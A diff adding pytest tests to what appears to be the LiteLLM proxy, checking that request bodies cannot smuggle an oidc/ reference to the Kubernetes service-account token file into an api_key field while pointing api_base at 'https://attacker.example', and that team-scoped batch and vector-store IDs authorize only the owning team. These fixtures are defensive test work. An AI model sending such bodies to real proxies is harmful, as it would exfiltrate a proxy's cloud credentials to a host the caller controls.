@@ -363,6 +363,227 @@ def test_configuring_a_deployment_still_cannot_carry_federation_fields_inline(ro
         )
 
 
+_SERVICE_ACCOUNT_TOKEN_REFERENCE: Final = "oidc/file//var/run/secrets/kubernetes.io/serviceaccount/token"
+
+
+def _user_config_with(litellm_params: dict[str, str]) -> dict[str, object]:
+    return {"model_list": [{"model_name": "devstral", "litellm_params": {"model": "mistral/devstral-latest", **litellm_params}}]}
+
+
+def _user_config_defaulting_to(litellm_params: dict[str, str]) -> dict[str, object]:
+    return {
+        "model_list": [
+            {
+                "model_name": "devstral",
+                "litellm_params": {"model": "mistral/devstral-latest", "api_base": "https://attacker.example"},
+            }
+        ],
+        "default_litellm_params": litellm_params,
+    }
+
+
+def _user_config_search_tool_with(litellm_params: dict[str, str]) -> dict[str, object]:
+    return {
+        "search_tools": [
+            {
+                "search_tool_name": "web",
+                "litellm_params": {"search_provider": "tavily", "api_base": "https://attacker.example", **litellm_params},
+            }
+        ]
+    }
+
+
+@pytest.fixture
+def oidc_api_key_credential(monkeypatch):
+    from litellm.types.utils import CredentialItem
+
+    monkeypatch.setattr(
+        litellm,
+        "credential_list",
+        [
+            CredentialItem(
+                credential_name="admin-oidc",
+                credential_values={"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE},
+                credential_info={"custom_llm_provider": "mistral"},
+            )
+        ],
+    )
+
+
+def _vector_store_embedding_config_with(embedding_config: dict[str, str]) -> dict[str, object]:
+    return {
+        "vector_store_id": "docs",
+        "custom_llm_provider": "milvus",
+        "litellm_params": {
+            "api_base": "https://milvus.example",
+            "litellm_embedding_config": {"api_base": "https://attacker.example", **embedding_config},
+        },
+    }
+
+
+def test_a_vector_store_embedding_config_may_carry_a_plain_api_key():
+    assert is_request_body_safe(
+        request_body=_vector_store_embedding_config_with({"api_key": "sk-embedding"}),
+        general_settings={},
+        llm_router=None,
+        model="",
+        route="/vector_store/new",
+    )
+
+
+@pytest.mark.parametrize("route", [None, "/model/new", "/health/test_connection"])
+@pytest.mark.parametrize(
+    "body",
+    [
+        {"model": "devstral", "api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE},
+        {"model": "devstral", "extra_body": {"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE}},
+        {"model": "devstral", "fallbacks": [{"model": "other", "api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE}]},
+        {
+            "model": "devstral",
+            "user_config": _user_config_with(
+                {"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE, "api_base": "https://attacker.example"}
+            ),
+        },
+        {"model": "devstral", "user_config": _user_config_defaulting_to({"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE})},
+        {"model": "web", "user_config": _user_config_search_tool_with({"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE})},
+        _vector_store_embedding_config_with({"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE}),
+    ],
+    ids=[
+        "top_level",
+        "extra_body",
+        "fallback_target",
+        "user_config",
+        "user_config_defaults",
+        "user_config_search_tool",
+        "vector_store_embedding_config",
+    ],
+)
+def test_a_request_body_cannot_carry_an_oidc_api_key_reference(route: str | None, body: dict):
+    """The call path reads an oidc/ api_key from the proxy's own filesystem or environment, so a body that set one
+    could send the proxy's service account token to a host the caller picks. No opt-in or route relaxes it."""
+    with pytest.raises(ValueError, match="api_key holds an oidc/ secret reference"):
+        is_request_body_safe(
+            request_body=body,
+            general_settings={"allow_client_side_credentials": True},
+            llm_router=None,
+            model="devstral",
+            route=route,
+        )
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        {"model": "devstral", "litellm_credential_name": "admin-oidc"},
+        {
+            "model": "devstral",
+            "user_config": _user_config_with(
+                {"litellm_credential_name": "admin-oidc", "api_base": "https://attacker.example"}
+            ),
+        },
+        {"model": "devstral", "user_config": _user_config_defaulting_to({"litellm_credential_name": "admin-oidc"})},
+        _vector_store_embedding_config_with({"litellm_credential_name": "admin-oidc"}),
+    ],
+    ids=["top_level", "user_config", "user_config_defaults", "vector_store_embedding_config"],
+)
+def test_a_request_body_cannot_name_a_credential_holding_an_oidc_api_key(oidc_api_key_credential, body: dict):
+    with pytest.raises(ValueError, match=r"names a credential .* oidc/ api_key secret reference"):
+        is_request_body_safe(
+            request_body=body,
+            general_settings={"allow_client_side_credentials": True},
+            llm_router=None,
+            model="devstral",
+        )
+
+
+@pytest.mark.parametrize("route", [None, "/chat/completions"])
+def test_a_call_cannot_carry_an_oidc_api_key_in_litellm_params(route: str | None):
+    with pytest.raises(ValueError, match="api_key holds an oidc/ secret reference"):
+        is_request_body_safe(
+            request_body={"model": "devstral", "litellm_params": {"api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE}},
+            general_settings={"allow_client_side_credentials": True},
+            llm_router=None,
+            model="devstral",
+            route=route,
+        )
+
+
+@pytest.mark.parametrize("route", ["/model/new", "/model/update", "/model/deployment-1/update", "/health/test_connection"])
+def test_a_deployment_write_may_carry_an_oidc_api_key_in_litellm_params(route: str):
+    """A proxy admin configures an oidc/ api_key on a deployment through these routes, and the model management role
+    gate refuses anyone else with a 403."""
+    assert (
+        is_request_body_safe(
+            request_body={
+                "model": "devstral",
+                "litellm_params": {"model": "mistral/devstral-latest", "api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE},
+            },
+            general_settings={},
+            llm_router=None,
+            model="devstral",
+            route=route,
+        )
+        is True
+    )
+
+
+_OIDC_DEPLOYMENT_PARAMS: Final = (
+    pytest.param({"model": "mistral/devstral-latest", "api_key": _SERVICE_ACCOUNT_TOKEN_REFERENCE}, id="inline"),
+    pytest.param({"model": "mistral/devstral-latest", "litellm_credential_name": "admin-oidc"}, id="named_credential"),
+)
+
+
+@pytest.mark.parametrize("override", ["api_base", "base_url"])
+@pytest.mark.parametrize("deployment_params", _OIDC_DEPLOYMENT_PARAMS)
+def test_a_base_override_cannot_send_the_deployments_oidc_api_key(
+    oidc_api_key_credential, deployment_params: dict, override: str
+):
+    from litellm.exceptions import BadRequestError
+    from litellm.router_utils.clientside_credential_handler import get_dynamic_litellm_params
+
+    with pytest.raises(BadRequestError, match="api_key is an oidc/ secret reference"):
+        get_dynamic_litellm_params(
+            litellm_params=dict(deployment_params), request_kwargs={override: "https://caller.example/v1"}
+        )
+
+
+@pytest.mark.parametrize("deployment_params", _OIDC_DEPLOYMENT_PARAMS)
+def test_a_base_override_with_the_callers_own_api_key_is_allowed(oidc_api_key_credential, deployment_params: dict):
+    from litellm.router_utils.clientside_credential_handler import get_dynamic_litellm_params
+
+    out: Final = get_dynamic_litellm_params(
+        litellm_params=dict(deployment_params),
+        request_kwargs={"api_base": "https://caller.example/v1", "api_key": "sk-caller"},
+    )
+    assert (out["api_base"], out["api_key"]) == ("https://caller.example/v1", "sk-caller")
+
+
+def test_test_connection_may_name_a_credential_holding_an_oidc_api_key(oidc_api_key_credential):
+    """The admin UI tests a stored credential by name, which is how a proxy admin checks an oidc/ api_key works."""
+    assert (
+        is_request_body_safe(
+            request_body={"model": "devstral", "litellm_params": {"litellm_credential_name": "admin-oidc"}},
+            general_settings={},
+            llm_router=None,
+            model="devstral",
+            route="/health/test_connection",
+        )
+        is True
+    )
+
+
+def test_a_user_config_with_its_own_api_key_is_still_allowed():
+    assert (
+        is_request_body_safe(
+            request_body={"model": "devstral", "user_config": _user_config_with({"api_key": "sk-client-owned"})},
+            general_settings={"allow_client_side_credentials": True},
+            llm_router=None,
+            model="devstral",
+        )
+        is True
+    )
+
+
 class TestCustomAuthCommonChecksWarning:
     """custom_auth_common_checks_warning only warns when custom auth is configured
     and the common-checks opt-in is off, since that is the only state where
@@ -1503,6 +1724,124 @@ async def test_managed_batch_routes_pass_team_model_access_check(route, request_
             team_object=LiteLLM_TeamTable(team_id="team-other", models=["some-other-model"]),
             llm_router=llm_router,
         )
+
+
+_TEAM_DEPLOYMENT_ID: Final = "team-a-deployment-id"
+_TEAM_INTERNAL_MODEL_NAME: Final = "model_name_team-a_6d1f3c2e-0000-4000-8000-000000000000"
+_TEAM_PUBLIC_MODEL_NAME: Final = "team-batch-model"
+_TEAM_MANAGED_BATCH_ID: Final = _encode_managed_id(
+    f"litellm_proxy;model_id:{_TEAM_DEPLOYMENT_ID};llm_batch_id:provider-batch-789"
+)
+
+
+def _team_scoped_router(public_model_name: str | None = _TEAM_PUBLIC_MODEL_NAME) -> Router:
+    return Router(
+        model_list=[
+            {
+                "model_name": _TEAM_INTERNAL_MODEL_NAME,
+                "litellm_params": {"model": "openai/gpt-4o-mini", "api_key": "test-key"},
+                "model_info": {
+                    "id": _TEAM_DEPLOYMENT_ID,
+                    "team_id": "team-a",
+                    **({"team_public_model_name": public_model_name} if public_model_name else {}),
+                },
+            },
+        ]
+    )
+
+
+def _team_scoped_character_id() -> str:
+    from litellm.types.videos.utils import encode_character_id_with_provider
+
+    return encode_character_id_with_provider(character_id="char_team", provider="openai", model_id=_TEAM_DEPLOYMENT_ID)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "route, request_data",
+    [
+        pytest.param("/v1/batches/{batch_id}", {"batch_id": _TEAM_MANAGED_BATCH_ID}, id="batch-retrieve"),
+        pytest.param("/v1/batches/{batch_id}/cancel", {"batch_id": _TEAM_MANAGED_BATCH_ID}, id="batch-cancel"),
+        pytest.param(
+            "/v1/fine_tuning/jobs/{fine_tuning_job_id}",
+            {
+                "fine_tuning_job_id": _encode_managed_id(
+                    f"litellm_proxy;model_id:{_TEAM_DEPLOYMENT_ID};generic_response_id:ftjob-1"
+                )
+            },
+            id="fine-tuning-job",
+        ),
+        pytest.param(
+            "/v1/vector_stores/{vector_store_id}",
+            {
+                "vector_store_id": _encode_managed_id(
+                    "litellm_proxy:vector_store;unified_id,vs-unified;"
+                    f"target_model_names,{_TEAM_PUBLIC_MODEL_NAME};resource_id,vs_1;model_id,{_TEAM_DEPLOYMENT_ID}"
+                )
+            },
+            id="vector-store",
+        ),
+        pytest.param(
+            "/v1/videos/characters/{character_id}",
+            {"character_id": _team_scoped_character_id()},
+            id="character",
+        ),
+    ],
+)
+async def test_team_scoped_managed_ids_authorize_only_the_owning_team_by_public_name(
+    route: str, request_data: dict[str, str]
+) -> None:
+    from litellm.proxy._types import ProxyException
+    from litellm.proxy.auth.auth_checks import can_key_call_resolved_model
+
+    llm_router: Final = _team_scoped_router()
+
+    async def check(team_id: str) -> None:
+        await can_key_call_resolved_model(
+            model=get_model_from_request(
+                request_data=request_data, route=route, llm_router=llm_router, team_id=team_id
+            ),
+            llm_model_list=None,
+            valid_token=UserAPIKeyAuth(api_key="sk-team", team_id=team_id, team_models=[_TEAM_PUBLIC_MODEL_NAME]),
+            llm_router=llm_router,
+        )
+
+    await check("team-a")
+    with pytest.raises(ProxyException) as exc_info:
+        await check("team-b")
+    assert exc_info.value.code == "403"
+
+
+@pytest.mark.asyncio
+async def test_legacy_team_alias_authorizes_a_team_batch_only_for_keys_granted_the_alias() -> None:
+    from litellm.proxy._types import ProxyException
+    from litellm.proxy.auth.auth_checks import can_key_call_resolved_model
+
+    llm_router: Final = _team_scoped_router(public_model_name=None)
+
+    async def check(key_models: list[str]) -> None:
+        await can_key_call_resolved_model(
+            model=get_model_from_request(
+                request_data={"batch_id": _TEAM_MANAGED_BATCH_ID},
+                route="/v1/batches/{batch_id}",
+                llm_router=llm_router,
+                team_id="team-a",
+            ),
+            llm_model_list=None,
+            valid_token=UserAPIKeyAuth(
+                api_key="sk-team",
+                team_id="team-a",
+                models=key_models,
+                team_models=["legacy-team-model"],
+                team_model_aliases={"legacy-team-model": _TEAM_INTERNAL_MODEL_NAME},
+            ),
+            llm_router=llm_router,
+        )
+
+    await check(["legacy-team-model"])
+    with pytest.raises(ProxyException) as exc_info:
+        await check(["some-other-model"])
+    assert exc_info.value.code == "403"
 
 
 def test_get_model_from_request_resolves_character_id_model_with_router():
